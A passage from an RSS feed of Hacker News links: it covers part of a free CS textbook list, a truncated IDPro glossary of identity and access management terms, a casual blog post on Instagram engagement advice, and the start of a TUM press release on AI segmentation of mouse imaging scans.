  <li><a href="http://arxiv.org/abs/1302.6946">Category Theory for Scientists</a> (Manuscript)</li>
  <li><a href="http://projecteuclid.org/euclid.bams/1183526392">Categorical Algebra</a> (technically a 1965 journal article from Bull. Amer. Math. Soc., 17(1):40–106, but up on Project Euclid.</li>
  <li>Higher Topos Theory: <a href="http://math.harvard.edu/~lurie/papers/croppedtopoi.pdf">Author version</a>,
  <a href="http://arxiv.org/abs/math/0608040">arXiv version</a></li>
  <li><a href="http://www.tac.mta.ca/tac/reprints/articles/10/tr10abs.html">Basic Concepts of Enriched Category Theory</a></li>
  <li>The online journal Theory and Applications of Categories archives electronic versions of some out of print category theory textbooks:  <a href="http://www.tac.mta.ca/tac/reprints/index.html">Reprints in Theory and Applications of Categories</a></li>
  <li><a href="https://bartoszmilewski.com/2014/10/28/category-theory-for-programmers-the-preface/">Category Theory for Programmers</a></li>
  <li><a href="http://www.mathematik.uni-regensburg.de/cisinski/CatLR.pdf">Higher Categories and Homotopical Algebra</a> author preprint</li>
  <li><a href="http://www.math.mcgill.ca/barr/papers/sac.pdf">*-Autonomous Categories</a></li>
  <li><a href="https://arxiv.org/abs/2002.06055">2-Dimensional Categories</a></li>
  <li><a href="https://reyes-reyes.com/2018/04/02/first-order-categorical-logic-2/">First-Order Categorical Logic</a></li>
  <li><a href="https://reyes-reyes.com/2004/06/01/generic-figures-and-their-glueings-a-constructive-approach-to-functor-categories/">Generic Figures and Their Glueings: A Constructive Approach to Functor Categories</a></li>
  <li><a href="http://www.math.jhu.edu/~eriehl/context.pdf">Category Theory in Context</a></li>
</ul>

<h2 id="language-implementation">Language Implementation</h2>

<ul>
  <li><a href="http://research.microsoft.com/en-us/um/people/simonpj/Papers/pj-lester-book/">Implementing Functional Languages: A Tutorial</a></li>
  <li><a href="http://research.microsoft.com/en-us/um/people/simonpj/papers/slpj-book-1987/">The Implementation of Functional Programming Languages</a></li>
  <li><a href="http://callvirt.net/blog/files/Shared%20Source%20CLI%202.0%20Internals.pdf">Shared Source CLI 2.0 Internals</a> 
  (<a href="http://callvirt.net/blog/post/SSCLI-20-Patch-for-VS-2010.aspx">shelved draft</a>)</li>
  <li><a href="http://wiki.squeak.org/squeak/64">Smalltalk-80: The Language and its Implementation</a> (a.k.a. “The Blue Book”)</li>
  <li><a href="http://dippl.org/">The Design and Implementation of Probabilistic Programming Languages</a></li>
</ul>

<h2 id="systems--networking-including-security-architecture">Systems &amp; Networking (including Security, Architecture)</h2>

<ul>
  <li>*<a href="https://www.aosabook.org/en/index.html">A Commentary on the Sixth Edition UNIX Operating System</a> (and <a href="http://v6.cuzuco.com/">UNIX v6 source code</a>)</li>
  <li><a href="https://www.distributed-systems.net/index.php/books/distributed-systems-3rd-edition-2017/">Distributed Systems, 3rd Edition</a> by van Steen and Tanenbaum</li>
  <li><a href="http://www.iecc.com/linker/">Linkers and Loaders</a></li>
  <li><a href="http://research.microsoft.com/en-us/people/philbe/ccontrol.aspx">Concurrency Control and Recovery in Database Systems</a></li>
  <li><a href="https://www.kernel.org/pub/linux/kernel/people/paulmck/perfbook/perfbook.html">Is Parallel Programming Hard, And, If So, What Can You Do About It?</a></li>
  <li><a href="http://pages.cs.wisc.edu/~remzi/OSTEP/">Operating Systems: Three Easy Pieces</a></li>
  <li><a href="http://www.tcpipguide.com/">The TCP/IP Guide</a></li>
  <li><a href="http://cs-www.cs.yale.edu/homes/aspnes/classes/465/notes.pdf">Notes on Theory of Distributed Systems, CPSC 465/565</a> (technically notes, but in practice an excellent textbook)</li>
  <li>*<a href="http://www.nobius.org/~dbg/practical-file-system-design.pdf">Practical File System Design with the Be File System</a></li>
  <li><a href="http://ocw.mit.edu/resources/res-6-004-principles-of-computer-system-design-an-introduction-spring-2009/online-textbook/">Principles of Computer System Design</a> (Authors share second half online, first half published in print by Elsevier)</li>
  <li><a href="http://webdam.inria.fr/Alice/">Foundations of Databases</a></li>
  <li><a href="http://www.cl.cam.ac.uk/~rja14/book.html">Security Engineering: A Guide to Building Dependable Distributed Systems</a></li>
  <li><a href="http://cnp3book.info.ucl.ac.be/">Computer Networking</a></li>
  <li><a href="http://www.sigcomm.org/content/ebook">Recent Advances in Networking, Volume 1</a></li>
  <li><a href="http://perfeval.epfl.ch/index.htm">Performance Evaluation Of Computer And Communication Systems</a></li>
  <li><a href="http://ica1www.epfl.ch/PS_files/NetCal.htm">The Network Calculus Book</a></li>
  <li>*<a href="https://www.systemsapproach.org/book.html">Computer Networking: A Systems Approach</a></li>
  <li><a href="https://nebelwelt.net/SS3P/">Software Security: Principles, Policies, and Protection</a></li>
  <li><a href="http://ecee.colorado.edu/~bart/book/book/index.html">Principles of Electronic Devices</a></li>
  <li><a href="https://www.netbsd.org/docs/internals/en/index.html">NetBSD Internals</a></li>
  <li><a href="https://www.cl.cam.ac.uk/~jac22/otalks/ods.pdf">Open Distributed Systems</a></li>
  <li><a href="https://www.distributedconsensus.net/">Foundations of Distributed Consensus and Blockchains</a></li>
</ul>

<h2 id="general-cs-theory-and-algorithms-including-ai-ml-data-science">General CS Theory and Algorithms (including AI, ML, Data Science…)</h2>

<ul>
  <li><a href="http://infolab.stanford.edu/~ullman/focs.html">Foundations of Computer Science</a></li>
  <li><a href="http://www.princeton.edu/~rvdb/LPbook/">Linear Programming: Foundations and Extensions</a></li>
  <li><a href="http://www.designofapproxalgs.com/">The Design of Approximation Algorithms</a></li>
  <li><a href="http://www.mmds.org/">Mining of Massive Datasets</a></li>
  <li><a href="http://mbmlbook.com/">Model-Based Machine Learning</a></li>
  <li><a href="https://www.microsoft.com/en-us/research/publication/foundations-of-data-science/">Foundations of Data Science</a></li>
  <li><a href="http://greenteapress.com/wp/think-data-structures/">Think Data Structures</a></li>
  <li><a href="http://greenteapress.com/wp/think-bayes/">Think Bayes: Bayesian Statistics Made Simple</a></li>
  <li><a href="https://greenteapress.com/wp/think-stats-2e/">Think Stats</a></li>
  <li><a href="https://www.cambridge.org/us/academic/subjects/computer-science/algorithmics-complexity-computer-algebra-and-computational-g/algorithmic-game-theory">Algorithmic Game Theory</a>
    <ul>
      <li>This one’s a bit awkward to find: Click on the “Resources” tab (right of Description and
  Contents), and in the resulting “General Resources” side-bar that appears to the left, click
  on the book title.  In the table that appears, click where the book title appears under the
  “Name” column; this is the full PDF of the book.</li>
    </ul>
  </li>
  <li><a href="https://muse.jhu.edu/book/60836">Reinforcement Learning: An Introduction</a> (also, direct PDF of
  author preprint of 2nd edition <a href="http://incompleteideas.net/book/bookdraft2018mar21.pdf">here</a>)</li>
  <li><a href="http://incompleteideas.net/book/the-book-2nd.html">Reinforcement Learning: An Introduction, 2nd Edition</a></li>
  <li><a href="https://muse.jhu.edu/book/60833">Machine Learning for Data Streams: with Practical Examples in MOA</a></li>
  <li><a href="https://fairmlbook.org/">Fairness and Machine Learning</a></li>
  <li><a href="http://www.deeplearningbook.org/">Deep Learning</a></li>
  <li><a href="http://www.algorithmsilluminated.org/">Algorithms Illuminated</a></li>
  <li><a href="https://seeing-theory.brown.edu/index.html">Seeing Theory: A Visual Introduction to Probability and Statistics</a></li>
  <li><a href="https://mml-book.github.io/">Mathematics for Machine Learning</a></li>
  <li><a href="https://web.engr.oregonstate.edu/~rosulekm/crypto/">The Joy of Cryptography</a></li>
  <li><a href="http://people.cs.bris.ac.uk/~nigel/Crypto_Book/">Cryptography, An Introduction</a></li>
  <li><a href="https://toc.cryptobook.us/">A Graduate Course in Applied Cryptography</a></li>
  <li><a href="http://neuralnetworksanddeeplearning.com/">Neural Networks and Deep Learning</a></li>
  <li><a href="https://qiskit.org/textbook/preface.html">Learn Quantum Computing using Qiskit</a></li>
  <li><a href="http://masfoundations.org/download.html">Multiagent Systems: Algorithmic, Game-Theoretic, and Logical Foundations</a></li>
  <li><a href="http://d2l.ai/">Dive into Deep Learning</a></li>
  <li><a href="http://discrete.openmathbooks.org/dmoi3.html">Discrete Mathematics: An Open Introduction, 3rd Edition</a></li>
  <li><a href="http://cs.brown.edu/people/jsavage/book/">Models Of Computation</a></li>
  <li><a href="http://diestel-graph-theory.com/index.html">Graph Theory</a></li>
  <li>*<a href="http://theory.cs.princeton.edu/complexity/">Computational Complexity: A Modern Approach (draft)</a></li>
  <li><a href="https://www.cis.upenn.edu/~aaroth/privacybook.html">The Algorithmic Foundations of Differential Privacy</a></li>
</ul>



<ul>
  <li><a href="http://vmls-book.stanford.edu/">Introduction to Applied Linear Algebra: Vectors, Matrices, and Least Squares</a></li>
  <li><a href="https://www.hsph.harvard.edu/miguel-hernan/causal-inference-book/">The Causal Inference Book</a></li>
  <li><a href="http://faculty.marshall.usc.edu/gareth-james/ISL/">An Introduction to Statistical Learning, with Applications in R</a></li>
  <li><a href="https://web.stanford.edu/~hastie/ElemStatLearn/">The Elements of Statistical Learning: Data Mining, Inference, and Prediction</a></li>
  <li><a href="http://linear.axler.net/">Linear Algebra Abridged</a> (Linear Algebra Done Right, minus proofs)</li>
  <li><a href="http://statsthinking21.org/index.html">Statistical Thinking for the 21st Century</a></li>
  <li><a href="http://web.stanford.edu/~boyd/cvxbook/">Convex Optimization</a></li>
  <li><a href="https://archive.org/details/AnIntroductionToProbabilityTheoryAndItsApplicationsVolume1">An Introduction to Probability Theory and its Applications</a></li>
  <li>[Numerical Linear Algebra] (https://people.maths.ox.ac.uk/trefethen/text.html)</li>
</ul>

<h2 id="computational-linguistics--natural-language-processing">Computational Linguistics &amp; Natural Language Processing</h2>

<ul>
  <li><a href="https://linguistics.ucla.edu/people/Kracht/courses/compling2-2007/formal.pdf">The Mathematics of Language</a> (<a href="https://linguistics.ucla.edu/people/Kracht/courses/compling2-2007/cl2007.html">via author’s homepage</a>)</li>
  <li><a href="https://www.fulcrum.org/concern/monographs/6h440s98b">The Syntactic Process</a></li>
  <li><a href="https://web.stanford.edu/~jurafsky/slp3/">Speech and Language Processing</a></li>
  <li><a href="https://github.com/jacobeisenstein/gt-nlp-class/tree/master/notes">Natural Language Processing</a></li>
  <li><a href="https://www.tidytextmining.com/">Text Mining with R</a></li>
  <li><a href="http://www.nltk.org/book/">Natural Language Processing with Python: Analyzing Text with the Natural Language Toolkit (NLTK)</a></li>
</ul>

<h2 id="education">Education</h2>

<ul>
  <li><a href="http://grid.cs.gsu.edu/~tcpp/curriculum/?q=cedr_book">Topics in Parallel and Distributed Computing: Introducing Concurrency in Undergraduate Courses</a> (preprint)</li>
</ul>

<h2 id="language-focused-introductions-to-computer-science">Language-Focused Introductions to Computer Science</h2>

<ul>
  <li><a href="http://mitpress.mit.edu/sicp/full-text/book/book.html">Structure and Interpretation of Computer Programs</a>
  (also: <a href="http://sicpebook.wordpress.com/ebook/">Unofficial PDF Ebook Reformatting</a>,
  and <a href="http://sicpinclojure.com/">SICP in Clojure</a>)</li>
  <li><a href="http://www.ccs.neu.edu/home/matthias/htdc.html">How to Design Classes (draft)</a></li>
  <li><a href="https://htdp.org/2018-01-06/">How to Design Programs (2nd Edition)</a></li>
  <li><a href="https://htdp.org/2003-09-26/">How to Design Programs (1st Edition)</a></li>
</ul>

<h2 id="specific-programming-languages">Specific Programming Languages</h2>

<p>While most of the books on this page are focused on more theoretical/foundational topics, sometimes you just need
to learn a programming language or look at some reference on a particular language feature.</p>
</div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://csgordon.github.io/books.html">https://csgordon.github.io/books.html</a></em></p>]]>
            </description>
            <link>https://csgordon.github.io/books.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25572852</guid>
            <pubDate>Tue, 29 Dec 2020 18:14:07 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Auth Terminology in the IDPro Body of Knowledge]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25572716">thread link</a>) | @mooreds
<br/>
December 29, 2020 | https://bok.idpro.org/article/id/41/ | <a href="https://web.archive.org/web/*/https://bok.idpro.org/article/id/41/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
   <tbody>
    <tr>
     <td>
      <strong>
       Term
      </strong>
     </td>
     <td>
      <strong>
       Definition
      </strong>
     </td>
     <td>
      <strong>
       Source
      </strong>
     </td>
    </tr>
    <tr>
     <td>
      Access Control
     </td>
     <td>
      Controlling who can have access to data, systems, services, resources, locations. The ‘Who’ can be a user, a device or thing, a service
     </td>
     <td>
      Introduction to Access Control
     </td>
    </tr>
    <tr>
     <td>
      Access Governance
     </td>
     <td>
      The assurance that all access has been given based on the correct decision criteria and parameters
     </td>
     <td>
      Introduction to Access Control
     </td>
    </tr>
    <tr>
     <td>
      Access Management
     </td>
     <td>
      Use of identity information to provide access control to protected resources such as computer systems, databases, or physical spaces.
     </td>
     <td>
      Introduction to IAM Architecture
     </td>
    </tr>
    <tr>
     <td>
      Access Policy
     </td>
     <td>
      Definition of the rules to allow or disallow access to secured objects.
     </td>
     <td>
      Introduction to Access Control
     </td>
    </tr>
    <tr>
     <td>
      Access Requester
     </td>
     <td>
      The person, process, system, or thing that seeks to access a protected resource.
     </td>
     <td>
      Introduction to Access Control
     </td>
    </tr>
    <tr>
     <td>
      Access Supplier
     </td>
     <td>
      The component granting access to data, systems, services after the access policy requirements (set in the Policy Administration Point) have been met by the Access Requester.
     </td>
     <td>
      Introduction to Access Control
     </td>
    </tr>
    <tr>
     <td>
      Account Takeover
     </td>
     <td>
      Account takeover is a form of identity theft and fraud, where a malicious third party successfully gains access to a user’s account credentials.
     </td>
     <td>
      Designing MFA for Humans
     </td>
    </tr>
    <tr>
     <td>
      Accountability
     </td>
     <td>
      The obligation of a person to accept the results of one’s actions, be they positive or negative. This person is probably also a species of an owner.
     </td>
     <td>
      Introduction to Access Control
     </td>
    </tr>
    <tr>
     <td>
      Adaptive Authentication
     </td>
     <td>
      Adaptive authentication aims to determine and enforce the authentication level required at any time during a user session - when the session is commenced, during the session when access requirements force a re-evaluation, or when the session token expires. The factors to be used in achieving that authentication level are determined dynamically based on the access control policy governing the resources being accessed, and a variety of environmental conditions and risk factors in effect at that time for that user.
     </td>
     <td>
      Designing MFA for Humans
     </td>
    </tr>
    <tr>
     <td>
      Agile Project Management
     </td>
     <td>
      A framework that uses a continuous, iterative process to deliver a defined piece of functionality, typically a component of a product or service. Scrum is a popular framework (
      <a href="https://www.scrumalliance.org/about-scrum/overview">
       <em>
        https://www.scrumalliance.org/about-scrum/overview
       </em>
      </a>
      )
     </td>
     <td>
      Introduction to IAM Project Management
     </td>
    </tr>
    <tr>
     <td>
      Architecture
     </td>
     <td>
      Framework for the design, deployment, and operation of an information technology infrastructure. It provides a structure whereby an organization can standardize the technology it uses and align its IT infrastructure with digital transformation policy, IT development plans, and business goals.
     </td>
     <td>
      Introduction to IAM Architecture
     </td>
    </tr>
    <tr>
     <td>
      Architecture Overview
     </td>
     <td>
      Describes the architecture components required for supporting IAM across the enterprise.
     </td>
     <td>
      Introduction to IAM Architecture
     </td>
    </tr>
    <tr>
     <td>
      Architecture Patterns
     </td>
     <td>
      Identifies the essential patterns that categorize the IT infrastructure architecture in an organization and will guide the deployment choices for IAM solutions.
     </td>
     <td>
      Introduction to IAM Architecture
     </td>
    </tr>
    <tr>
     <td>
      Attributes
     </td>
     <td>
      Key/value pairs relevant for the digital identity (username, first name, last name, etc.).
     </td>
     <td>
      An Overview of the Digital Identity Lifecycle
     </td>
    </tr>
    <tr>
     <td>
      Authentication
     </td>
     <td>
      The ability to prove that a user or application is trustworthy and has the authority to access a protected resource by validating credentials of an access requester (a user, a process, a system, or a thing).
     </td>
     <td>
      Introduction to Access Control
     </td>
    </tr>
    <tr>
     <td>
      Authorization
     </td>
     <td>
      Determining a user’s rights to access functionality with a computer application and the level at which that access should be granted. In most cases, an ‘authority’ defines and grants access, but in some cases, access is granted because of inherent rights (like patient access to his/her own medical data)
     </td>
     <td>
      Introduction to Access Control
     </td>
    </tr>
    <tr>
     <td>
      Bot
     </td>
     <td>
      Sometimes called an Internet bot, short for ‘robot’ but referring to a software routine that performs automated tasks over the Internet or a web robot referring to an autonomous network application, or simply a ‘bot’ referring to an automated, typically repetitive, task used for a specific purpose.
     </td>
     <td>
      Non-Human Account Management
     </td>
    </tr>
    <tr>
     <td>
      Ceremonies
     </td>
     <td>
      Predictable interactions that users can infrequently navigate in a well-watched place
     </td>
     <td>
      Introduction to Identity – Part 2: Access Control
     </td>
    </tr>
    <tr>
     <td>
      CIA Triad
     </td>
     <td>
      The fundamental Information security concepts of risk classification of resources from the perspectives of Confidentiality, Integrity, and Availability.
     </td>
     <td>
      Non-Human Account Management
     </td>
    </tr>
    <tr>
     <td>
      Consent
     </td>
     <td>
      Permission for something to happen or agreement to do something.
     </td>
     <td>
      Introduction to Privacy and Compliance for Consumers
     </td>
    </tr>
    <tr>
     <td>
      Consumer Protection Law
     </td>
     <td>
      Laws and regulations that are designed to protect the
      <a href="https://en.wikipedia.org/wiki/Rights">
       <em>
        rights
       </em>
      </a>
      of individual
      <a href="https://en.wikipedia.org/wiki/Consumers">
       <em>
        consumers
       </em>
      </a>
      and to stop unfair, deceptive, and fraudulent business practices.
     </td>
     <td>
      Laws Governing Identity Systems
     </td>
    </tr>
    <tr>
     <td>
      Continuous Authentication
     </td>
     <td>
      Continuous authentication is a mechanism that uses a variety of signals and measurements to determine during a user session if there is any change in the confidence that it is still the same user that authenticated at the beginning of the session, and trigger an authentication action if there is a drop in confidence.
     </td>
     <td>
      Designing MFA for Humans
     </td>
    </tr>
    <tr>
     <td>
      Contract Law
     </td>
     <td>
      Laws that relate to making and enforcing agreements between or among separate parties.
     </td>
     <td>
      Laws Governing Identity Systems
     </td>
    </tr>
    <tr>
     <td>
      Data Controller
     </td>
     <td>
      Defined in Article 4(7) of the GDPR: “‘controller’ means the natural or legal person, public authority, agency or other body which, alone or jointly with others, determines the purposes and means of the processing of personal data;”. This article uses the term “organisation” as a synonym for “data controller”, since organisations involved in IAM will normally be data controllers.
     </td>
     <td>
      An Introduction to the GDPR
     </td>
    </tr>
    <tr>
     <td>
      Data Mapping
     </td>
     <td>
      “a system of cataloguing what data you collect, how it’s used, where it’s stored, and how it travels throughout your organization and beyond.”
     </td>
     <td>
      Impact of GDPR on Identity and Access Management
     </td>
    </tr>
    <tr>
     <td>
      Data Processor
     </td>
     <td>
      Defined in Article 4(8) of the GDPR for situations where an organisation processes personal data solely on the instructions of others. A Data Processor must not determine the purposes of processing, for example by processing in its own interests, or, beyond limited technical choices, the means of doing so. Data Processors are regulated by Article 28: in particular they must have a contract with the Data Controller that covers all the subjects listed in Article 28(3). Data Processors are excluded from some, but not all, of the liabilities and duties of Data Controllers.
     </td>
     <td>
      An Introduction to the GDPR
     </td>
    </tr>
    <tr>
     <td>
      Data Protection by Design
     </td>
     <td>
      Data protection through technology design. See GDPR Article 25 for more detail
     </td>
     <td>
      Impact of GDPR on Identity and Access Management
     </td>
    </tr>
    <tr>
     <td>
      Data Protection Officer
     </td>
     <td>
      An individual who must be appointed in any organization that processes any data defined by the GDPR as sensitive. The DPO is responsible for “Working towards the compliance with all relevant data protection laws, monitoring specific processes, such as data protection impact assessments, increasing employee awareness for data protection and training them accordingly, as well as collaborating with the supervisory authorities.”(See GDPR Articles 35, 37, 38, and 39 for more detail)
     </td>
     <td>
      Impact of GDPR on Identity and Access Management
     </td>
    </tr>
    <tr>
     <td>
      Data Subject
     </td>
     <td>
      Defined in Article 4(1) of the GDPR (see “Personal Data” above) as the formal term for the human to whom personal data relates. This article uses the term “individual” as a synonym for “data subject”.
     </td>
     <td>
      An Introduction to the GDPR
     </td>
    </tr>
    <tr>
     <td>
      Decentralized Identifier (DID)
     </td>
     <td>
      An identifier that is created and anchored in a decentralized system such as a blockchain or ledger and can represent any entity in the ecosystem – an issuer, a holder, a verifier, and even an identity hub.
     </td>
     <td>
      A Peek into the Future of Decentralized Identity
     </td>
    </tr>
    <tr>
     <td>
      Delegated Authorization Framework
     </td>
     <td>
      An access control framework that decouples authentication from …</td></tr></tbody></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://bok.idpro.org/article/id/41/">https://bok.idpro.org/article/id/41/</a></em></p>]]>
            </description>
            <link>https://bok.idpro.org/article/id/41/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25572716</guid>
            <pubDate>Tue, 29 Dec 2020 18:05:32 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why Your Instagram Engagement Kinda Sucks]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25572567">thread link</a>) | @DLay
<br/>
December 29, 2020 | https://rainylune.com/blogs/blog/why-your-instagram-engagement-kinda-sucks-right-now | <a href="https://web.archive.org/web/*/https://rainylune.com/blogs/blog/why-your-instagram-engagement-kinda-sucks-right-now">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p><span>Back in November, Instagram reached out to me and asked me to schedule a call with them so a media expert from the Instagram Partnerships team could give me advice on how I could grow my account.&nbsp;I shall now share the results of my espionage with you 🐸</span></p>

<p><span>For privacy reasons, I'll refer to the person I spoke to as Mr. Ig. I got a ton of really useful information out of this call, and I will probably have to write multiple articles to cover it all. The most important thing I learned was that Instagram’s algorithm will either </span><b>reward</b><span> or </span><b>punish</b><span> you based on your usage of the app as a whole. There are over 500 different factors, but it takes much more into account than just the likes, views, comments, etc of a specific post. </span><b>The algorithm ranks your specific post by taking into account your use of Instagram as a </b><b><i>whole</i></b><b>.</b></p>

<p><span>Think of it like the algorithm is grading you in a class. One test alone doesn’t determine your whole grade - there’s still participation points, homework, classwork, projects, and more. You’ve gotta participate&nbsp;throughout the class as a whole, not just show up for one test and get an A on it.</span></p>

<h3><strong>Here are the top 3 things I’ll cover on what you should be doing to make your Instagram engagement suck less:</strong></h3>
<h3><span>1. Reels</span></h3>
<h3><span>2. Use all of Instagram’s features</span></h3>
<h3><span>3. Consistency</span></h3>

<h2><b>why things suck #1: no feelies, only reelies</b></h2>

<p><span>Reels are a new Instagram feature, meant to be a competitor to TikTok. They haven't been rolled out in every country yet. Reels are the current cheat code to success for Instagram right now. They are also one of the reasons why so many people saw their engagement tank this fall. This is because </span><b>reels are currently boosted in the algorithm. </b><span>Once the reels feature isn’t so new a few months from now, it will likely be downgraded to normal weight.&nbsp;</span></p>
<br>
<blockquote>
<h3><span><span>✨ <strong>If you are not posting at least 1 reel a week, the algorithm is going to punish </strong></span><strong><i>all </i>your posts. ✨</strong></span></h3>
</blockquote>

<p><span>Example:</span></p>
<p>a) I post a reel on Monday. I make normal posts on Tuesday - Friday. All my posts for this week will see higher engagement because of this.</p>
<p>b) I haven’t posted a reel in 2 weeks. My engagement for this past week has absolutely tanked. Once I post a reel again, the posts that follow have a much better shot at seeing more engagement.&nbsp;</p>

<p><span>According to Mr. Ig, the Ideal™️ amount of reels per week is 4-7. Unfortunately, this is a bit difficult to do, thanks to the fact that a majority of people have lives outside of this app.</span></p>
<br>
<h5><span>Mr. Ig: so do you think you could be making 4-7 compelling reels per week for the next month or so?&nbsp;</span></h5>
<h5><span>me, a full time student and shop owner, laughing in disbelief: uh no not really&nbsp;</span></h5>
<p><img src="https://cdn.shopify.com/s/files/1/0339/7061/8505/files/ahahahah_480x480.jpg?v=1608511259" alt="crying while laughing frog"></p>

<p><span>who the hell has the amount of time and mental health required for all that?? not me binch!!! So, my advice to you as a human who enjoys keeping what is left of my sanity intact, is to try to do a minimum of </span><b>one reel per week</b><span>. if you’re feelin it.</span></p>

<p><img src="https://cdn.shopify.com/s/files/1/0339/7061/8505/files/sanity_480x480.jpg?v=1608511747" alt="Rainylune's advice: 1 reel per week"></p>

<p><span>Instagram currently has a team that is dedicated entirely to just finding good reels for them to promote. If your reel is chosen to be featured, they’ll choose to show it to more people for around a month, leading to a ton of views. But keep in mind that the promo team is Specifically looking at the back end for reels that were made using Instagram’s in app editor. which means no recycling tikt oks. You can still have recycled videos do really well, but this basically disqualifies you from being chosen by the team.&nbsp;</span></p>
<br>
<h2><b>why things suck #2: instagram wants you to use all their features :)&nbsp; a l l &nbsp; o f &nbsp; t h e m :) and use them often :)&nbsp;&nbsp;</b></h2>
<p><span>aka “you will be graded for this class based on participation throughout the semester”</span></p>

<p><span>Instagram likes it when you are spending all your time on the app :) and using all of their available features aside from normal feed posts :) They like it when you post a </span><b>combination</b><span> of normal posts, reels, IGTV, stories, shoppable posts, etc etc. You know those little events they do in stories like the “I Voted” sticker? participate in that school spirit kinda junk. The algorithm likes it when you use the in app camera and filters, geolocation tagging, messaging, story buttons, all that stuff. use app more. have many different thing to offer you :) sell your soul :)</span></p>

<h3><strong>Instagram’s Highly Unrealistic Ideal Amount of Posts of Each Type Per Week:</strong></h3>
<h3><span></span></h3>
<h3><span>• 3 feed posts per week (reels &amp; IGTV you choose to post to feed count here)</span></h3>
<h3><span>• 8-10 stories per week, preferably 2+ per day</span></h3>
<h3><span>• 4-7 reels per week</span></h3>
<h3>
<span>• 1-3 IGTV a week</span></h3>
<h3><strong>Rachel’s Far More Realistic Ideal Amounts Per Week For People Who Don’t Want to Go Insane:</strong></h3>
<h3><span>• 1-2 stories per day, preferably of your pets, so that i can see more pets (please show me your pets)</span></h3>
<h3><span>• 1 reel per week</span></h3>
<h3><span>• an IGTV if you’re feelin spicy?? i personally do not want to go through that kind of effort</span></h3>
<h3><span>• [REDACTED] amount of normal feed posts (check next section)</span></h3>

<h2><b>why things suck #3: consistency is key babeyyy</b></h2>

<p><span>Mr. Ig confirmed that the algorithm encourages posting more often. but some of us still have a small sliver of mental health that we wish to keep, so he gave me advice for us weaklings who are actually human. And that advice is to be </span><b>consistent over time.&nbsp;</b></p>
<p><span>Some examples he gave:</span></p>
<p>• posting on Monday, Wednesday, and Saturday every week</p>
<p>• posting every other day</p>
<p>• posting 3 times per week</p>

<p><span>Publish your posts consistently at the same time (during your follower’s peak hours) over a long period of time. The algorithm likes consistency and patterns. breaking that pattern make it mad :(&nbsp;</span></p>

<p><span>Following all of these instructions right away will not cause you to see instant success and growth. The key is to be consistent and persistent over time. and eventually. you’ll maybe get there :’)</span></p>
<br>
<h2><b>in conclusion: algorithm sucks but i hope this makes it a little less suck</b></h2>

<p><span>Please keep in mind that all of this is just Instagram’s Ideal™️, and Instagram does not care about your mental health and sanity!! But I do!! Please do not feel pressured like “oh god now i gotta come up with 7 reels a week just to get views on all my other posts otherwise i am subjected to instagram corporal punishment :(“ because seriously, the amount they want from people is inhumane. Take care of your own mental health and sanity first.&nbsp;</span></p>

<p><span>There are so many other things that factor into growing your Instagram audience, and this barely scratches the surface. I have many more&nbsp;articles about it that I still need to write, especially since numbers and the amount of content you churn out isn’t everything. So please remember that all of this is simply advice, not a bible to live by. be realistic and kind to yourself. or else. 🐸🔪</span></p>
</div></div>]]>
            </description>
            <link>https://rainylune.com/blogs/blog/why-your-instagram-engagement-kinda-sucks-right-now</link>
            <guid isPermaLink="false">hacker-news-small-sites-25572567</guid>
            <pubDate>Tue, 29 Dec 2020 17:56:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Self-learning algorithms analyze medical imaging data]]>
            </title>
            <description>
<![CDATA[
Score 13 | Comments 4 (<a href="https://news.ycombinator.com/item?id=25572558">thread link</a>) | @gmays
<br/>
December 29, 2020 | https://www.tum.de/nc/en/about-tum/news/press-releases/details/36399/ | <a href="https://web.archive.org/web/*/https://www.tum.de/nc/en/about-tum/news/press-releases/details/36399/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><img title="Segmentation" alt="Thanks to artificial intelligence, the AIMOS software is able to recognize bones and organs on three-dimensional grayscale images and segments them, which makes the subsequent evaluation considerably easier. " src="https://www.tum.de/fileadmin/_processed_/a/a/csm_201123_Oliver_Schoppe_AE_183_2100_c1de664141.jpg" width="1280" height="540"><figcaption>
				
					Thanks to artificial intelligence, the AIMOS software is able to recognize bones and organs on three-dimensional grayscale images and segments them, which makes the subsequent evaluation considerably easier. 
				
				<p><span>
					
						Image: Astrid Eckert / TUM
					
				</span></p></figcaption></div><div><div><article itemscope="itemscope" itemtype="http://schema.org/Article"><header><p itemprop="description">
					Imaging techniques enable a detailed look inside an organism. But interpreting the data is time-consuming and requires a great deal of experience. Artificial neural networks open up new possibilities: They require just seconds to interpret whole-body scans of mice and to segment and depict the organs in colors, instead of in various shades of gray. This facilitates the analysis considerably.

				</p></header><section><p>How big is the liver? Does it change if medication is taken? Is the kidney inflamed? Is there a tumor in the brain and did metastases already develop? In order to answer such questions, bioscientists and doctors to date had to screen and interpret a wealth of data.</p><p>"The analysis of three-dimensional imaging processes is very complicated," explains Oliver Schoppe. Together with an interdisciplinary research team, the TUM researcher has now developed self-learning algorithms to in future help analyze bioscientific image data.</p><p>At the core of the AIMOS software – the abbreviation stands for AI-based Mouse Organ Segmentation – are artificial neural networks that, like the human brain, are capable of learning. "You used to have to tell computer programs exactly what you wanted them to do," says Schoppe. "Neural networks don't need such instructions:" It's sufficient to train them by presenting a problem and a solution multiple times. Gradually, the algorithms start to recognize the relevant patterns and are able to find the right solutions themselves."</p><div id="c61471"><div><div><p>In the AIMOS project, the algorithms were trained with the help of images of mice. The objective was to assign the image points from the 3D whole-body scan to specific organs, such as stomach, kidneys, liver, spleen, or brain. Based on this assignment, the program can then show the exact position and shape.</p><p>"We were lucky enough to have access to several hundred image of mice from a different research project, all of which had already been interpreted by two biologists," recalls Schoppe. The team also had access to fluorescence microscopic 3D scans from the Institute for Tissue Engineering and Regenerative Medicine at the Helmholtz Zentrum München.</p><p>Through a special technique, the researchers were able to completely remove the dye from mice that were already deceased. The transparent bodies could be imaged with a microscope step by step and layer for layer. The distances between the measuring points were only six micrometers – which is equivalent to the size of a 